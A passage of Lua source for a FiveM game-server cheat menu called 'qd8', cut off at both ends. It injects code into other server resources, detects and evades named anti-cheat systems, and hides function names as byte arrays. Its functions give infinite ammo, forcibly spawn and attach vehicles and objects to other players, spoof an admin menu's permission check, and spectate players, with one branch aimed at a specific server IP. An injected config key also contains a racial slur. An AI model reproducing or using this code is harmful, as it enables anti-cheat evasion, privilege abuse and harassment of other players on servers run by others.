                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.qd8FreecamObject then DestroyCam(_G.qd8FreecamObject, false) _G.qd8FreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]])
            end
        else
            _G.qd8FreecamEnabled = false
            _G.qd8FreecamThreadRunning = false

            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
            hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
            hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
            hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
            hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
            hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
            hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
            hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
            hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
            hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
            hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
            hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
            hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

            RenderScriptCams(false, false, 0, true, true)
            if _G.qd8FreecamObject then DestroyCam(_G.qd8FreecamObject, false) _G.qd8FreecamObject = nil end
            SetFocusEntity(PlayerPedId())
        end
    end
end

function qd8:EnableInfiniteAmmo()
if GetResourceState("WaveShield") == "started" then
    print('1')
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        if not _G.qd8InfAmmo then
            _G.qd8InfAmmo = { enabled = false }
        end
        _G.qd8InfAmmo.enabled = true
        local PlayerPedId_fn           = g({80,108,97,121,101,114,80,101,100,73,100})
        local GetSelectedPedWeapon_fn  = g({71,101,116,83,101,108,101,99,116,101,100,80,101,100,87,101,97,112,111,110})
        local GetHashKey_fn            = g({71,101,116,72,97,115,104,75,101,121})
        local GetAmmoInPedWeapon_fn    = g({71,101,116,65,109,109,111,73,110,80,101,100,87,101,97,112,111,110})
        local AddAmmoToPed_fn          = g({65,100,100,65,109,109,111,84,111,80,101,100})
        local DoesEntityExist_fn       = g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})
        local Wait_fn                  = g({87,97,105,116})

        local lastClip = {}   -- ped -> last known clip size

        local function initFlow(cb)
            local co = coroutine.create(cb)
            local function execCycle()
                while coroutine.status(co) ~= "dead" do
                    local ok, err = coroutine.resume(co)
                    if not ok then
                        print("^1[qd8 InfAmmo] Coroutine error: ^7", err)
                        break
                    end
                    Wait_fn(0)
                end
            end
            execCycle()
        end

        if not _G.qd8WaveLoop then
            _G.qd8WaveLoop = true
            initFlow(function()
                while _G.qd8WaveLoop do
                    if _G.qd8InfAmmo.enabled then
                        local ped = PlayerPedId_fn()
                        if DoesEntityExist_fn(ped) then
                            local weapon = GetSelectedPedWeapon_fn(ped)
                            if weapon and weapon ~= GetHashKey_fn("WEAPON_UNARMED") then
                                local _, clip = GetAmmoInPedWeapon_fn(ped, weapon)
                                local key = tostring(ped)

                                if not lastClip[key] then
                                    lastClip[key] = clip
                                end

                                if clip < lastClip[key] then
                                    AddAmmoToPed_fn(ped, weapon, lastClip[key] - clip)
                                end
                            end
                        end
                    else
                        coroutine.yield()
                    end
                    coroutine.yield()
                end
            end)
        end
    else
        if GetResourceState("ReaperV4") == 'started' then
            MachoInjectResourceRaw("any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]])
        else
            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]])
        end
    end
end

function qd8:DisableInfiniteAmmo()
    if GetResourceState("WaveShield") == "started" then
        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            if _G.qd8InfAmmo then
                _G.qd8InfAmmo.enabled = false
            end
        ]])
    else
        if GetResourceState("ReaperV4") == 'started' then
            MachoInjectResourceRaw("any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]])
        else
            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]])
        end
    end
end

function qd8:AttachSelectedVehicle(playerIds, vehicleModel)
    if not playerIds or #playerIds == 0 then 
        self:Notify("error", "qd8", "No players selected!", 3000)
        return 
    end
    if not vehicleModel or #vehicleModel == 0 then 
        self:Notify("error", "qd8", "Invalid vehicle model!", 3000)
        return 
    end

    local function encodeToByteArrayLiteral(str)
        local t = {}
        for i = 1, #str do t[i] = string.byte(str, i) end
        return table.concat(t, ",")
    end

    
    local model = vehicleModel
    local modelBytes = encodeToByteArrayLiteral(model)
    local serverEndpoint = GetCurrentServerEndpoint()
    local successCount = 0
    
    for _, playerId in ipairs(playerIds) do
        if GetResourceState("solos-rentals") == "started" then
            print("[vehicle_attach] Fallback: solos-rentals")
            local success, err = pcall(function()
                MachoInjectResource("solos-rentals", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("amigo") == "started" then
            print("[vehicle_attach] Fallback: Amigo RP")
            local success, err = pcall(function()
                MachoInjectResourceRaw("adminMenu", string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("qb-core") == "started" then
            print("[vehicle_attach] Fallback #02")
            local success, err = pcall(function()
                MachoInjectResource("qb-core", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif serverEndpoint:match("([^:]+)") == "185.244.106.12" and GetResourceState("drc_gardener") == "started" then
            print("[vehicle_attach] Fallback #1")
            local success, err = pcall(function()
                MachoInjectResource("drc_gardener", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("lunar_bridge") == "started" then
            print("[vehicle_attach] Fallback #2")
            local success, err = pcall(function()
                MachoInjectResourceRaw("lunar_bridge", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
            
        elseif GetResourceState("lation_laundering") == "started" then
            print("[vehicle_attach] Fallback #3")
            local success, err = pcall(function()
                MachoInjectResourceRaw("lation_laundering", string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]], modelBytes, playerId))
            end)
            if success then successCount = successCount + 1 end
        else
            print("[vehicle_attach] Universal Fallback")
            local success, err = pcall(function()
                local script = string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]], modelBytes, playerId)
                MachoInjectResourceRaw("any", script, playerId)
            end)
            if success then successCount = successCount + 1 end
        end
    end
end


function encodeToByteArrayLiteral(str)
    if not str then return "" end
    if type(str) ~= "string" then
        return tostring(str)
    end
    if #str == 0 then return "" end
    local bytes = {}
    for i = 1, #str do
        bytes[#bytes + 1] = tostring(string.byte(str, i))
    end
    return table.concat(bytes, ", ")
end

function qd8:SpawnSelectedObject(playerIds)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "qd8", "No players selected!", 3000)
        return
    end
    local model = self:GetSelectedObjectModel()
    if not model or #model == 0 then
        self:Notify("error", "qd8", "Invalid object model!", 3000)
        return
    end
    local modelBytes = encodeToByteArrayLiteral(model)
    local successCount = 0
    for _, playerId in ipairs(playerIds) do
        if GetResourceState("qb-core") == "started" or GetResourceState("mc9-core") == "started" and
        (GetResourceState("ElectronAC") == "started" or
            GetResourceState("FiniAC") == "started" or
            GetResourceState("ReaperV4") == "started" or
            GetResourceState("WaveShield") == "started") then
            self:Notify("error", "qd8", "Using Qb-core Spawner!", 3000)
            MachoInjectResource("qb-core", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]], modelBytes, playerId))
            successCount = successCount + 1
        elseif GetResourceState("cd_dispatch") == "started" then
            print("using fallback")
            -- Dedicated cd_dispatch branch: Hook CreateObject for hash override and model loading
            MachoInjectResource("cd_dispatch", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]], modelBytes, playerId))
            successCount = successCount + 1
        elseif GetResourceState("rcore_drunk") == "started" then
            MachoInjectResourceRaw("rcore_drunk", string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("lc_fuel") == "started" then
            MachoInjectResourceRaw("lc_fuel", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("0r-illegalpack") == "started" then
            MachoInjectResourceRaw("0r-illegalpack", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("xradio") == "started" then
            MachoInjectResourceRaw("xradio", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        else
            MachoInjectResourceRaw("any", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]], modelBytes, playerId))
            successCount = successCount + 1
        end
    end
    self:Notify("success", "qd8", string.format("Object '%s' spawned on %d/%d player(s)!", model, successCount, #playerIds), 5000)
end

function qd8:HandleSpectateToggle(playerId, enabled)
    if not playerId then
        self:Notify("error", "qd8", "Invalid player ID provided!", 3000)
        return
    end
    local targetServerId = tonumber(playerId)
    if not targetServerId then
        self:Notify("error", "qd8", "Invalid server ID format!", 3000)
        return
    end
    if targetServerId == tonumber(GetPlayerServerId(PlayerId())) then
        self:Notify("error", "qd8", "You cannot spectate yourself!", 3000)
        return
    end
    if enabled then
        self:Notify("success", "qd8", ("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetServerId)) or "Unknown", targetServerId), 3000)
    else
        self:Notify("error", "qd8", ("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetServerId)) or "Unknown", targetServerId), 3000)
    end
    local reaper = GetResourceState('ReaperV4') == 'started'

    if reaper then
        print('Spectate Fallback #3 (ReaperV4 detected, running direct)')
        if not GetPlayerName(GetPlayerFromServerId(targetServerId)) then
            self:Notify("error", "qd8", "Target player not found!", 3000)
            print("[ReaperV4 Spectate] Error: No player found for server ID:", targetServerId)
            return
        end
        local code = string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.qd8Spectate or not _G.qd8Spectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.qd8Spectate.back
                local heading = _G.qd8Spectate.heading
                local wasVisible = _G.qd8Spectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.qd8Spectate.enabled = false
